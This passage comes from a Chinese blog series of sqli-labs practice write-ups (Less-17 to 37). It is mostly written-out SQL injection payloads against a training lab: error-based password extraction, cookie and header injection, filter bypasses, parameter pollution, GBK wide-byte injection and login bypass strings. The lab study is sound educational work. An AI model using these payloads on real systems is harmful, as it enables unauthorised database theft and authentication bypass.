<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=admin&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and column_name not in (&#x27;user_id&#x27;,&#x27;user&#x27;,&#x27;first_name&#x27;,&#x27;last_name&#x27;,&#x27;avatar&#x27;,&#x27;last_login&#x27;,&#x27;failed_login&#x27;)),0x7e),1) --+ &amp;submit=Submit</span><br></pre></td></tr></table></figure>

<p>爆值</p>
<p>使用<code>uname=admin&amp;passwd=admin&#39; and updatexml(1,concat(0x7e,(select  group_concat(password) from users),0x7e),1) --+ &amp;submit=Submit</code>发现不行</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220303161708544.png" alt="image-20220303161708544"></p>
<p>加一层select</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=admin&#x27; and  updatexml(1,concat(0x7e,(select password from (select password from users where username=&#x27;admin&#x27;))),1) --+ &amp;submit=Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220303161850632.png" alt="image-20220303161850632"></p>
<p>最终payload：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=<span class="number">11&#x27;</span>  <span class="function"><span class="keyword">and</span>  <span class="title">updatexml</span>(<span class="params"><span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> password <span class="keyword">from</span> (<span class="keyword">select</span> password <span class="keyword">from</span> users limit <span class="number">7</span>,<span class="number">1</span></span>) test ),0x7e),1) --+&amp;submit</span>=Submit</span><br></pre></td></tr></table></figure>

<h3 id="Less-18-http头部报错注入用户代理-‘"><a href="#Less-18-http头部报错注入用户代理-‘" class="headerlink" title="Less-18 http头部报错注入用户代理[‘]"></a>Less-18 http头部报错注入用户代理[‘]</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220303163459427.png" alt="image-20220303163459427"></p>
<p>这一题中password做了check，又看到insert语句，他把user-agent插入到了数据库，所以可以从这里下手，而且看的出来是单引号型，接下来开始爆破，修改<code>user-agent</code>为以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#x27;</span><br></pre></td></tr></table></figure>



<h3 id="Less-19-http头部Referer-报错注入-‘"><a href="#Less-19-http头部Referer-报错注入-‘" class="headerlink" title="Less-19 http头部Referer 报错注入[‘]"></a>Less-19 http头部Referer 报错注入[‘]</h3><h3 id="Less-20-cookie注入"><a href="#Less-20-cookie注入" class="headerlink" title="Less-20 cookie注入"></a>Less-20 cookie注入</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220303221542409.png" alt="image-20220303221542409"></p>
<p>注入点在cookie字段处，我们输入用户名和密码后，用burp抓包，测其闭合方式为单引号闭合，显示位为3位，<code>Cookie: uname=admin&#39; order by 3--+ </code></p>
<p>之后可以用联合查询法，爆出其数据库名，表名，及其列名</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220303221953858.png" alt="image-20220303221953858"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="tag">ctf刷题记录</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-sqli-labs刷题记录page-2" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/" class="article-date">
      <time datetime="2022-02-28T16:00:00.000Z" itemprop="datePublished">2022-03-01</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/">sqli-labs刷题记录page-2</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="Page-2-Adv-Injections"><a href="#Page-2-Adv-Injections" class="headerlink" title="Page-2 (Adv Injections)"></a>Page-2 (Adv Injections)</h1><h3 id="less-21—复杂的字符型Cookie注入"><a href="#less-21—复杂的字符型Cookie注入" class="headerlink" title="less 21—复杂的字符型Cookie注入"></a>less 21—复杂的字符型Cookie注入</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220303223610729.png" alt="image-20220303223610729"></p>
<p>和上一关的区别在于cookie进行了base64编码以及闭合方式不同</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test&#x27;) union select user(),version(),database()#</span><br><span class="line">加密后为：</span><br><span class="line">dGVzdCcpIHVuaW9uIHNlbGVjdCB1c2VyKCksdmVyc2lvbigpLGRhdGFiYXNlKCkj</span><br></pre></td></tr></table></figure>

<p>按照less20，可以得到</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220303224804084.png" alt="image-20220303224804084"></p>
<h3 id="less-22—双引号字符型Cookie注入"><a href="#less-22—双引号字符型Cookie注入" class="headerlink" title="less 22—双引号字符型Cookie注入"></a>less 22—双引号字符型Cookie注入</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220303225057977.png" alt="image-20220303225057977"></p>
<p>和上一关比只是修改了闭合方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test&quot; union select user(),version(),database()#</span><br><span class="line">base64加密后：</span><br><span class="line">dGVzdCIgdW5pb24gc2VsZWN0IHVzZXIoKSx2ZXJzaW9uKCksZGF0YWJhc2UoKSM=</span><br></pre></td></tr></table></figure>

<h3 id="less-23—基于错误的，过滤注释的GET型"><a href="#less-23—基于错误的，过滤注释的GET型" class="headerlink" title="less 23—基于错误的，过滤注释的GET型"></a>less 23—基于错误的，过滤注释的GET型</h3><p>这道题思路很多，这里主要是通过过滤不严格，采用了别的效果的注释符：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1’ and updatexml(1,concat(0x7e,(select@@version),0x7e),1);%00</span><br></pre></td></tr></table></figure>

<p> 或者在结尾使用and ‘1去闭合也是一样的道理</p>
<p> 或者在结尾使用and ‘1去闭合也是一样的道理</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319083336671.png" alt="image-20220319083336671"></p>
<h3 id="less-24—二次注入"><a href="#less-24—二次注入" class="headerlink" title="less 24—二次注入"></a>less 24—二次注入</h3><p>先进行注册新账号，<code>admin&#39;#</code></p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220207110513722.png" alt="image-20220207110513722"></p>
<p>主要记录了表单相关的信息，没有啥敏感代码，当做 Index.html 来看待就可以了，逻辑是这样的：提示输入用户名和密码，用户名和密码正确之后就可以成功登陆，否则登陆失败。</p>
<p>忘记密码：左下角的忘记密码选项提示：如果你忘记密码 请 hack it<br>新建用户：右下角新建用户可以新建一个自己的用户</p>
<p>进行登录后修改密码</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220207112655750.png" alt="image-20220207112655750"></p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220207113315330.png" alt="image-20220207113315330"></p>
<p>再次用admin账号登录时，使用修改过的密码即可以登录，这两个账号的密码一样</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220207113421229.png" alt="image-20220207113421229"></p>
<h3 id="less-25"><a href="#less-25" class="headerlink" title="less 25"></a>less 25</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319084551067.png" alt="image-20220319084551067"></p>
<p>id 直接单引号拼接，但是被如下函数过滤了</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319084705752.png" alt="image-20220319084705752"></p>
<p>过滤了 or 和 and 关键词，简单绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1’||extractvalue(1,concat(0x7e,database()))–+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319084817977.png" alt="image-20220319084817977"></p>
<h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h3><p><code>id=$id</code>，与 Less-25 相比，只是拼接方式改变，但因为代码中没有输出报错信息，所以也无法进行报错注入，其他利用方式都是一样的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,3 --+			#联合查询时，注意把前面的数据置否</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,(SELECT+GROUP_CONCAT(username,passwoorrd+SEPARATOORR+0x3c62723e)+FROM+users) -–+</span><br></pre></td></tr></table></figure>

<p>password写成了passwoorrd，SEPARATOR写成SEPARATOORR<br><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319085054071.png" alt="image-20220319085054071"></p>
<p>password写成了passwoorrd，SEPARATOR写成SEPARATOORR</p>
<h3 id="Less-26"><a href="#Less-26" class="headerlink" title="Less 26"></a>Less 26</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319085351658.png" alt="image-20220319085351658"></p>
<p>id&#x3D;’$id’</p>
<p>过滤了or 和 and 大小写，过滤了 &#x2F;、 *、 –、 #、 空格、 斜线</p>
<p>?id&#x3D;1’发现存在报错注入</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319085851955.png" alt="image-20220319085851955"></p>
<p>?id&#x3D;”闭合了</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319085938644.png" alt="image-20220319085938644"></p>
<p>?id&#x3D;’||’</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319090017928.png" alt="image-20220319090017928"></p>
<p>直接使用报错注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; || updatexml(1,concat(0x7e,database()),1) || &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>



<h3 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less 26a"></a>Less 26a</h3><blockquote>
<p>$sql&#x3D;”SELECT * FROM users WHERE id&#x3D;(‘$id’) LIMIT 0,1”;</p>
</blockquote>
<p>拼接方式改变</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)||(&#x27;</span><br></pre></td></tr></table></figure>

<p>页面回显正常</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=100’%0Bunion%0Bselect%0B1,2,3%0Baandnd%0B’1’=&#x27;1</span><br></pre></td></tr></table></figure>



<h3 id="Less-27"><a href="#Less-27" class="headerlink" title="Less 27"></a>Less 27</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319090517379.png" alt="image-20220319090517379"></p>
<p>直接使用报错输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; || updatexml(1,concat(0x7e,database()),1) || &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319090635726.png" alt="image-20220319090635726"></p>
<p>字过滤，空格</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1’%0Bununionion%0BseLect%0B1,2,3%0Band%0B’1</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319090755421.png" alt="image-20220319090755421"></p>
<h3 id="Less-28"><a href="#Less-28" class="headerlink" title="Less 28"></a>Less 28</h3><p>id&#x3D;(‘$id’)</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319091147465.png" alt="image-20220319091147465"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)  %0a order  %0a  by %0a  3 ;%00 </span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319092745410.png" alt="image-20220319092745410"></p>
<h3 id="Less-29"><a href="#Less-29" class="headerlink" title="Less 29"></a>Less 29</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3 --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319093507400.png" alt="image-20220319093507400"></p>
<p>查看<strong>login.php</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"># 查询 query 的字符串</span><br><span class="line">$qs = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line"></span><br><span class="line"># 模拟 tomcat 的查询函数 处理一下</span><br><span class="line">$id1=java_implimentation($qs);</span><br><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line"></span><br><span class="line"># 再次过滤检测</span><br><span class="line">whitelist($id1);</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line">if 查询到结果:</span><br><span class="line">    输出查询的详细信息</span><br><span class="line">else:</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">function java_implimentation($query_string)</span><br><span class="line">&#123;</span><br><span class="line">    $q_s = $query_string;</span><br><span class="line">    # &amp; 作为分隔符 分割字符串</span><br><span class="line">    $qs_array= explode(&quot;&amp;&quot;,$q_s);</span><br><span class="line"></span><br><span class="line">    # 遍历 qs_array 数组</span><br><span class="line">    foreach($qs_array as $key =&gt; $value)</span><br><span class="line">    &#123;    </span><br><span class="line">        $val=substr($value,0,2);</span><br><span class="line">        # 如果数组前两位是 id 的话</span><br><span class="line">        if($val==&quot;id&quot;)</span><br><span class="line">        &#123;    </span><br><span class="line">            # 截取 $value 的3-30 的字符串 作为 id 的值 </span><br><span class="line">            $id_value=substr($value,3,30); </span><br><span class="line">            return $id_value;</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function whitelist($input)</span><br><span class="line">&#123;</span><br><span class="line">    # 过滤规则 检测数字</span><br><span class="line">    $match = preg_match(&quot;/^\d+$/&quot;, $input);</span><br><span class="line">    if 不符合规则：</span><br><span class="line">        header(&#x27;Location: hacked.php&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">可以发现，问题出现在：</span><br><span class="line"></span><br><span class="line">$id1=java_implimentation($qs);</span><br><span class="line">...</span><br><span class="line">whitelist($id1);</span><br><span class="line">whitelist过滤是比较严格的，如果 id 不是数字的话就会直接重定向到 &#x27;hacked.php&#x27;，这里是没毛病的。那么问题出在了这里函数&#x27;$id1=java_implimentation($qs)&#x27;;</span><br><span class="line"></span><br><span class="line">因为 return 表示了函数的结束运行，所以这个函数捕捉到 id 的时候就会返回 return $id_value，这样就导致了 用户加入构造两组 id 的话，那么后面的 id 就会绕过函数检测。</span><br><span class="line"></span><br><span class="line">假设用户输入这样的语句：</span><br><span class="line">index.php?id=1&amp;id=2</span><br><span class="line">Apache PHP 会解析最后一个参数</span><br><span class="line">Tomcat JSP 会解析第一个参数</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-2&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>

<h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less 30"></a>Less 30</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319093945598-1653725870448.png" alt="image-20220319093945598"></p>
<p>和less29没什么本质变化，只是拼接方式不一样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-2&quot; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319094255229.png" alt="image-20220319094255229"></p>
<h3 id="Less-31"><a href="#Less-31" class="headerlink" title="Less 31"></a>Less 31</h3><p><code>id=（&quot;$id&quot;）</code></p>
<p>直接构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-2&quot;) union select 1,2,3 --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319094421820.png" alt="image-20220319094421820"></p>
<h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less 32"></a>Less 32</h3><p>构造?id&#x3D;1，发现回显正常</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220130200518028.png" alt="image-20220130200518028"></p>
<p>构造?id&#x3D;1’</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220130201230423.png" alt="image-20220130201230423"></p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319094950654.png" alt="image-20220319094950654"></p>
<p>这里输入的’直接被转义成\了，一般情况下，是不存在SQL注入的，不过有一个特例，就是当数据库的编码为GBK时，可以使用宽字节注入，宽字节的格式时在地址后先加一个%df，再加一个单引号，因为反斜杠的编码为%5c，而在GBK编码中，%df%5是繁体字“連”，所以这时，单引号成功逃逸，报出MySQL的数据库错误</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220131102727746.png" alt="image-20220131102727746"></p>
<p>根据错误判断闭合方式为’-+，并且为字符型注入，确定回显位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df&#x27; order by 1(/2/3/4)--+</span><br></pre></td></tr></table></figure>

<p>这里括号里是或，从1~4,最终到4时回显Unknown column ‘4’ in ‘order clasue’，说明爆出的字段数为3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220131103344678.png" alt="image-20220131103344678"></p>
<p>查看当前库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,database() --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220131103704301.png" alt="image-20220131103704301"></p>
<p>查看security库下的所有表</p>
<p>由于单引号被转义了，所以不能输入<code>tabel_schema=&#39;security&#39;</code>，这里输入为<code>table_schema=database()</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220131103939361.png" alt="image-20220131103939361"></p>
<p>查看users表下的所有字段，这里的单引号也被转义，所以将users转化为16进制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273)--+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220131104142610.png" alt="image-20220131104142610"></p>
<p>查看usename,password字段下的所有值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,(select group_concat(username,password) from security.users)--+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220131104542234.png" alt="image-20220131104542234"></p>
<h3 id="Less-33"><a href="#Less-33" class="headerlink" title="Less 33"></a>Less 33</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319095049478.png" alt="image-20220319095049478"></p>
<p>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串，和 Less-32 的函数功能是差不的，依旧可以使用宽字节进行注入。<br> 使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，才能防御此漏洞</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319095340334.png" alt="image-20220319095340334"></p>
<h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less 34"></a>Less 34</h3><p>过滤方法和less33一致，只是由GET 型变成了POST型</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319095538195.png" alt="image-20220319095538195"></p>
<p>我们用万能密码的方式的来突破这一关：</p>
<p>username：�’ or 1&#x3D;1#<br> Password：随便填</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319100052436.png" alt="image-20220319100052436"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原始的 sql 语句为</span><br><span class="line">@$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;</span><br><span class="line">此时 sql 语句为</span><br><span class="line">SELECT username, password FROM users WHERE username=&#x27;� &#x27; or 1=1#&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>

<h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less 35"></a>Less 35</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319100513064.png" alt="image-20220319100513064"></p>
<p>实际进行注入利用的时候并不需要写单引号，那么就尝试直接注入看看吧：<br> ?id&#x3D;1 and updatexml(1,concat(0x7e,(select version())),1)</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319100608266.png" alt="image-20220319100608266"></p>
<h3 id="Less-36"><a href="#Less-36" class="headerlink" title="Less 36"></a>Less 36</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df’ and updatexml(1,concat(0x7e,(select version())),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319100911685.png" alt="image-20220319100911685"></p>
<h3 id="Less-37"><a href="#Less-37" class="headerlink" title="Less 37"></a>Less 37</h3><p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319101243994.png" alt="image-20220319101243994"></p>
<p>本关与 34 关是大致相似的，区别在于处理 post 内容用的是 mysql_real_escape_string()函数，而不是 addslashes()函数，但是原理是一致的。</p>
<p>我们直接使用之前所用过的万能密码来突破一下：</p>
<p>username：�’ or 1&#x3D;1#</p>
<p>password：任意</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/image-20220319101400429.png" alt="image-20220319101400429"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="tag">ctf刷题记录</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-sqli-labs刷题记录page-3" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/" class="article-date">
      <time datetime="2022-02-28T16:00:00.000Z" itemprop="datePublished">2022-03-01</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/">sqli-labs刷题记录page-3</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
